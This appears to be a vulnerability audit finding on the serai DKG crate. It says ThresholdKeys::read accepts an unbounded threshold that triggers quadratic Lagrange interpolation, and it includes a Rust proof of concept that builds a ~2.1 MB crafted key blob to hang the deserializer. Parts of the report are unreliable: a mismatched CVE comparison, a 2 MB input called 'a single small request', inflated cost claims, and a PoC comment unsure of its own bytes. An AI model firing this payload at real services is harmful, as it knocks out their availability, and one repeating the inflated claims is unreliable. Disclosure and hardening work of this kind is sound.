### Title
Quadratic Lagrange interpolation in `ThresholdKeys::new` enables CPU-exhaustion DoS via crafted `ThresholdKeys` bytes - ([File: crypto/dkg/src/lib.rs](crypto/dkg/src/lib.rs))

### Summary
`ThresholdKeys::read` accepts a fully attacker-controlled threshold parameter `t` (a `u16` up to 65535) and then calls `ThresholdKeys::new`, which computes the group key by evaluating `interpolation_factor` once for every participant in `1..=t`. Each `interpolation_factor` call for `Interpolation::Lagrange` is itself `O(t)` field operations, making deserialization `O(t²)` — roughly 4.3 billion scalar multiplications at `t = 65535`. An unauthenticated peer that can feed ~2 MB of crafted bytes to `ThresholdKeys::read` can hang the caller, analogous to the CVE's "hang or frequently repeatable crash" availability impact.

### Finding Description
`ThresholdKeys::read` deserializes `t`, `n`, and `i` directly from the byte stream with no size cap beyond `u16` [1](#0-0) . With the `Lagrange` interpolation tag (`0x01`), no coefficients are read — only `n` verification-share points [2](#0-1) . It then calls `ThresholdKeys::new` [3](#0-2) .

`ThresholdKeys::new` accepts any `t <= n` and computes the group key by summing `verification_shares[i] * interpolation_factor(*i, &t)` over `t = participants 1..=t` [4](#0-3) . For `Interpolation::Lagrange`, `interpolation_factor` iterates over every element of `included` computing numerator and denominator products [5](#0-4) , so the group-key computation costs `t` iterations × `t` field multiplications each — `O(t²)` scalar multiplications plus one inversion per iteration.

`ThresholdParams::new` permits `t = n = 65535` since it only rejects `t == 0`, `n == 0`, `t > n`, and `i > n` [6](#0-5) . `ThresholdKeys::new` likewise only checks share count and that participant indexes are `<= n` [7](#0-6) .

### Impact Explanation
A `ThresholdKeys::read` call on a crafted payload with `t = n = 65535`, `interpolation = Lagrange`, and 65535 valid encoded points (~2.1 MB for 32-byte points) performs ~65535 × 65534 ≈ 4.3×10⁹ scalar multiplications and 65535 field inversions inside `ThresholdKeys::new` before returning. This is a complete hang of the deserializing thread: any service, coordinator, or validator that loads `ThresholdKeys` material arriving over an untrusted channel (key backup, reshare payload, peer-supplied key blob) can be denied service with a single small request. This matches the CVE-2022-39408 class: a low-privilege, network-reachable input causing a hang/DoS in a routine (here key deserialization/interpolation rather than query optimization).

### Likelihood Explanation
The trigger requires only that some reachable code path deserializes `ThresholdKeys` from bytes an unprivileged party controls — `ThresholdKeys::read` is explicitly on the untrusted-input surface for this codebase. The payload is trivial to construct (all-`0xFF` fields for `t`/`n`, `i = 1`, tag `0x01`, one scalar, then 65535 repetitions of the generator encoding), needs no valid DKG output, and no secret knowledge. Exploitation probability is high wherever key material is accepted or restored from an external source; where `ThresholdKeys` are only ever locally generated, the path is unreachable.

### Recommendation
Cap `t`/`n` at a protocol-appropriate maximum (e.g., a `MAX_THRESHOLD` constant) inside `ThresholdParams::new` and `ThresholdKeys::read` before any allocation or interpolation work. Alternatively, reject deserialization-time group-key computation for large `t` by deferring or bounding `interpolation_factor` evaluation, and read `t`/`n` before reading `n` points so oversized parameters are rejected before the `O(n)` parse and `O(t²)` interpolation begin.

### Proof of Concept
```rust
use std::io::Cursor;
use serai_dkg::ThresholdKeys;        // crypto/dkg
use ciphersuite::{group::GroupEncoding, Ciphersuite};
use ciphersuite::Secp256k1;          // or any in-scope ciphersuite

fn dos_payload() -> Vec<u8> {
    let mut buf = Vec::new();
    // C::ID length + ID (must match Secp256k1::ID)
    buf.extend((<Secp256k1 as Ciphersuite>::ID.len() as u32).to_le_bytes());
    buf.extend(<Secp256k1 as Ciphersuite>::ID);
    // t = 65535, n = 65535, i = 1
    buf.extend(65535u16.to_le_bytes());
    buf.extend(65535u16.to_le_bytes());
    buf.extend(1u16.to_le_bytes());
    // interpolation = Lagrange
    buf.push(1u8);
    // secret_share: any canonical scalar
    buf.extend([0u8; 32]);           // zero scalar is canonical for repr check? use [1,0,..]
    // n verification shares: repeat the encoded generator
    let g = Secp256k1::generator().to_bytes();
    for _ in 0..65535 { buf.extend(g.as_ref()); }
    buf
}

fn main() {
    let mut r = Cursor::new(dos_payload());   // ~2.1 MB
    // Hangs inside ThresholdKeys::new computing 65535 O(t) Lagrange factors
    let _ = ThresholdKeys::<Secp256k1>::read(&mut r);
}
```

The read succeeds past `ThresholdParams::new(t=65535, n=65535, i=1)` and the share-count check, then enters the quadratic loop at `crypto/dkg/src/lib.rs:376-378`, burning ~4.3×10⁹ scalar multiplications — a repeatable, input-triggered hang.

### Citations

**File:** crypto/dkg/src/lib.rs (L166-178)
```rust
  pub const fn new(t: u16, n: u16, i: Participant) -> Result<ThresholdParams, DkgError> {
    if (t == 0) || (n == 0) {
      return Err(DkgError::ZeroParameter { t, n });
    }

    if t > n {
      return Err(DkgError::InvalidThreshold { t, n });
    }
    if i.0 > n {
      return Err(DkgError::InvalidParticipant { n, participant: i });
    }

    Ok(ThresholdParams { t, n, i })
```

**File:** crypto/dkg/src/lib.rs (L229-247)
```rust
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L355-365)
```rust
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L591-602)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };
```

**File:** crypto/dkg/src/lib.rs (L604-623)
```rust
    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }
```

**File:** crypto/dkg/src/lib.rs (L625-631)
```rust
    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
